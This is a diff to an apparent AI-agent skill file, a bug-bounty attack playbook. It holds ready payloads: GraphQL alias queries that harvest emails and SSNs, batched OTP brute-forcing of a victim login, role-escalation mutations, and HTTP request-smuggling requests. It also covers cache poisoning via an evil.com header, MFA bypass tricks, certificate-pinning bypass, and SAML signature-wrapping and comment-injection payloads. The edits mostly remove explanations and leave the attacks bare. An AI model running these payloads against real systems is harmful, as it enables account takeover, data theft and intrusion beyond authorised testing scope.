@@ -1,9 +1,9 @@
 ---
 name: advanced-techniques
-description: Framework-specific attack playbooks (Next.js, Laravel, Spring Boot, Django, WordPress, Ruby on Rails, GraphQL), mobile app testing (Android APK decompilation, iOS binary analysis, Frida/objection), CI/CD pipeline attacks (GitHub Actions, GitLab CI), HTTP request smuggling deep-dive, cache poisoning, and MFA/2FA bypass patterns. Use when targeting specific frameworks or need platform-specific attack vectors.
+description: Framework-specific attack playbooks, mobile app testing, CI/CD pipeline attacks, HTTP request smuggling, cache poisoning, and MFA/2FA bypass patterns. With differential testing integrated. Use when targeting specific frameworks or need platform-specific attack vectors.
 ---
 
-# ADVANCED BUG BOUNTY TECHNIQUES
+# ADVANCED BUG BOUNTY TECHNIQUES — DIFFERIAL TESTING INTEGRATED
 
 Framework-specific attacks, mobile testing, CI/CD pipelines, and deep-dive technique references.
 
@@ -29,7 +29,6 @@ curl -s https://target.com/dashboard | grep -o '__NEXT_DATA__.*</script>' | \
   python3 -c "import sys,json; d=json.loads(sys.stdin.read().replace('__NEXT_DATA__ = ','').replace('</script>','')); print(json.dumps(d['props'], indent=2))"
 
 # rewrites proxy creating SSRF
-# Check next.config.js for rewrites like { source: '/api/:path*', destination: 'http://internal/:path*' }
 curl "https://target.com/api/../../admin/internal-endpoint"
 ```
 
@@ -139,18 +138,17 @@ curl -s https://target.com/.env | grep SECRET_KEY_BASE
 # Alias-based IDOR (fetch multiple users in one request)
 {a1: user(id: "1") { email ssn } a2: user(id: "2") { email ssn } a3: user(id: "3") { email ssn }}
 
-# Batched queries for rate limit bypass (send 1000 login attempts in one request)
+# Batched queries for rate limit bypass
 [
   {"query":"mutation{login(email:\"victim@test.com\",otp:\"0001\"){token}}"},
   {"query":"mutation{login(email:\"victim@test.com\",otp:\"0002\"){token}}"}
 ]
 
-# Nested query DoS (resource exhaustion)
+# Nested query DoS
 {users {posts {comments {author {posts {comments {author {id}}}}}}}}
 
 # Mutation authorization bypass
 mutation { updateUserRole(userId: "victim", role: ADMIN) { id role } }
-mutation { transferCredits(to: "attacker", amount: 9999) { balance } }
 ```
 
 ---
@@ -170,21 +168,12 @@ grep -rn "api_key\|secret\|password\|token\|Bearer" target_jadx/
 # Check AndroidManifest.xml for exported components
 grep -i 'exported="true"' target_src/AndroidManifest.xml
 
-# Find deep link handlers (potential injection points)
+# Find deep link handlers
 grep -A5 '<data android:scheme' target_src/AndroidManifest.xml
 
-# Check for cleartext traffic
-grep -i "cleartextTrafficPermitted" target_src/AndroidManifest.xml
-
-# Certificate pinning bypass with Frida + objection
+# Certificate pinning bypass
 objection -g com.target.app explore
 # Then: android sslpinning disable
-
-# Extract shared preferences (rooted device)
-adb shell cat /data/data/com.target.app/shared_prefs/*.xml
-
-# Check for WebView vulnerabilities
-grep -rn "loadUrl\|addJavascriptInterface\|setJavaScriptEnabled" target_jadx/
 ```
 
 ### iOS
@@ -193,15 +182,12 @@ grep -rn "loadUrl\|addJavascriptInterface\|setJavaScriptEnabled" target_jadx/
 # Extract IPA from jailbroken device
 frida-ios-dump -u com.target.app
 
-# Binary analysis — extract strings
+# Binary analysis
 strings target.app/target | grep -i "api\|key\|secret\|http\|password\|token"
 
-# Class dump for method names
+# Class dump
 class-dump -H target.app/target -o headers/
 grep -rn "admin\|debug\|hidden\|internal\|test" headers/
-
-# Check Info.plist for URL schemes and transport security exceptions
-plutil -p target.app/Info.plist | grep -i "transport\|scheme\|query\|exception"
 
 # Runtime manipulation with Frida
 frida -U -f com.target.app -l bypass_ssl.js
@@ -209,16 +195,16 @@ frida -U -f com.target.app -l bypass_ssl.js
 
 ### Common Mobile Bugs
 
-| Bug | Where to Find | Impact |
-|-----|---------------|--------|
-| Hardcoded API keys | Decompiled source, strings | Depends on key scope |
+| Bug | Where | Impact |
+|-----|-------|--------|
+| Hardcoded API keys | Decompiled source | Depends on scope |
 | Certificate pinning bypass | Frida/objection | MitM on all traffic |
 | Exported components | AndroidManifest.xml | Launch internal activities |
 | Deep link injection | URL scheme handlers | Trigger actions without auth |
-| Local data storage (cleartext) | SharedPreferences, SQLite | Credential theft |
-| WebView XSS | loadUrl with user-controlled data | Cookie theft, phishing |
-| Intent redirection | startActivity with untrusted Intent | Access internal components |
-| Backup extraction | android:allowBackup="true" | Extract app data via ADB |
+| Local data storage | SharedPreferences, SQLite | Credential theft |
+| WebView XSS | loadUrl with user data | Cookie theft |
+| Intent redirection | startActivity with untrusted Intent | Internal component access |
+| Backup extraction | android:allowBackup="true" | Extract app data |
 
 ---
 
@@ -228,8 +214,6 @@ frida -U -f com.target.app -l bypass_ssl.js
 
 ```yaml
 # DANGEROUS: pull_request_target + checkout of PR code
-# pull_request_target runs in BASE repo context (has secrets)
-# But if it checks out the PR branch, attacker code runs WITH those secrets
 on: pull_request_target
 steps:
   - uses: actions/checkout@v4
@@ -238,20 +222,11 @@ steps:
   - run: make build  # Attacker-controlled Makefile runs with repo secrets
 ```
 
-**What to look for in `.github/workflows/*.yml`:**
-
 ```bash
-# 1. pull_request_target with checkout of PR code
+# What to look for:
 grep -rn "pull_request_target" .github/workflows/
-grep -rn "github.event.pull_request.head" .github/workflows/
-
-# 2. Expression injection — user-controlled data in run: commands
-grep -rn '${{ github.event' .github/workflows/ | grep "run:"
-
-# 3. Write permissions on workflow that PRs can trigger
+grep -rn 'github.event.pull_request.head' .github/workflows/
 grep -rn "permissions:" .github/workflows/ -A5 | grep "write"
-
-# 4. Secrets used in reusable workflows accessible to forks
 grep -rn "secrets\." .github/workflows/ | grep -v "github.token"
 ```
 
@@ -259,18 +234,18 @@ grep -rn "secrets\." .github/workflows/ | grep -v "github.token"
 
 ```yaml
 # DANGEROUS: rules:changes on fork MRs + before_script
-# If CI runs on merge requests from forks with access to CI/CD variables
 variables:
-  DEPLOY_KEY: $DEPLOY_KEY  # Set in project CI/CD settings
+  DEPLOY_KEY: $DEPLOY_KEY
 before_script:
   - echo $DEPLOY_KEY | base64 -d > ~/.ssh/id_rsa
 ```
 
 ---
 
-## 4. HTTP REQUEST SMUGGLING DEEP-DIVE
+## 4. HTTP REQUEST SMUGGLING
 
-### CL.TE — Content-Length front-end, Transfer-Encoding back-end
+### CL.TE
+
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -282,7 +257,8 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-### TE.CL — Transfer-Encoding front-end, Content-Length back-end
+### TE.CL
+
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -296,7 +272,8 @@ SMUGGLED
 0
 ```
 
-### TE.TE — Both support TE, obfuscate to disable one
+### TE.TE (Obfuscation)
+
 ```http
 Transfer-Encoding: xchunked
 Transfer-Encoding: chunked
@@ -305,80 +282,46 @@ Transfer-Encoding: x
 Transfer-Encoding:[tab]chunked
 ```
 
-### H2.CL — HTTP/2 front-end with Content-Length injection
-```
-# In Burp Repeater, switch to HTTP/2
-# Add Content-Length header manually (not auto-set by HTTP/2)
-# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
-# Back-end uses CL → desync
-```
-
-### Detection (Burp)
-```
-1. Install HTTP Request Smuggler extension
-2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
-3. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
-```
-
 ---
 
 ## 5. CACHE POISONING
 
-### Unkeyed Headers
-```
-# X-Forwarded-Host often unkeyed
+```http
+# Unkeyed headers
 GET / HTTP/1.1
 Host: target.com
 X-Forwarded-Host: evil.com
+# If reflected → cache serves response with evil.com to all users
 
-# If reflected: cache serves response with evil.com to all users
-```
-
-### Fat GET
-```
-# HTTP/1.1 allows duplicate headers — front-end uses one, back-end uses other
+# Fat GET
 GET /?param=normal HTTP/1.1
 Host: target.com
 X-HTTP-Method-Override: POST
 Content-Length: 0
-
-# If cache keys on GET param but back-end sees POST → poison
-```
-
-### Parameter Cloaking
-```
-# WAF blocks ?redirect= but not ?&redirect=
-# Or: ?utm_content=foo&utm_source=bar&redirect=evil.com
-# Some caches ignore parameters after semicolons
+# If cache keys on GET param but backend sees POST → poison
 ```
 
 ---
 
-## 6. MFA / 2FA BYPASS PATTERNS
+## 6. MFA/2FA BYPASS
 
 | # | Pattern | Test |
 |---|---------|------|
-| 1 | **Response manipulation** | Change `{"verified": false}` → `{"verified": true}` |
-| 2 | **SMS delay exploit** | Request OTP, wait for expiry, try old code on different endpoint |
-| 3 | **Backup code brute** | 4-6 digit backup codes, often no rate limit |
-| 4 | **Cookie/session manipulation** | Set `mfa_completed=true` cookie after first factor |
-| 5 | **Step skip** | Navigate directly to /dashboard after first factor, bypass MFA check |
-| 6 | **Race on OTP** | Send 10 concurrent OTP verification requests before lockout |
-| 7 | **SMS callback** | If SMS gateway has webhook, intercept OTP in transit |
+| 1 | Response manipulation | Change `{"verified": false}` → `{"verified": true}` |
+| 2 | SMS delay exploit | Request OTP, wait for expiry, try old code on different endpoint |
+| 3 | Backup code brute | 4-6 digit backup codes, often no rate limit |
+| 4 | Cookie/session manipulation | Set `mfa_completed=true` cookie after first factor |
+| 5 | Step skip | Navigate directly to /dashboard after first factor |
+| 6 | Race on OTP | Send 10 concurrent OTP verification requests before lockout |
+| 7 | SMS callback | If SMS gateway has webhook, intercept OTP in transit |
 
 ---
 
 ## 7. SAML ATTACKS
 
 ### XSW (XML Signature Wrapping)
-```xml
-<!-- Original valid assertion -->
-<saml:Assertion>
-  <saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
-  <!-- signature wraps this -->
-</saml:Assertion>
 
-<!-- XSW: move the original assertion inside a new element -->
+```xml
 <saml:Assertion>
   <xx:Execute xmlns:xx="http://example.com">
     <saml:Assertion>
@@ -386,20 +329,18 @@ Content-Length: 0
     </saml:Assertion>
   </xx:Execute>
 </saml:Assertion>
-<!-- Signature still validates against the first Assertion element,
-     but the application processes the inner one -->
+<!-- Signature validates on outer, app processes inner -->
 ```
 
 ### Comment Injection
+
 ```xml
-<saml:NameID>admin@example.com</saml:NameID>
-<!-- becomes -->
 <saml:NameID>admin@example.com<!-- -->@attacker.com</saml:NameID>
 ```
 
 ### Signature Stripping
+
 ```bash
-# Remove the signature entirely — some implementations don't verify
 # Remove <ds:Signature>...</ds:Signature> block
 # If app doesn't re-validate → assertion accepted without signature
 ```
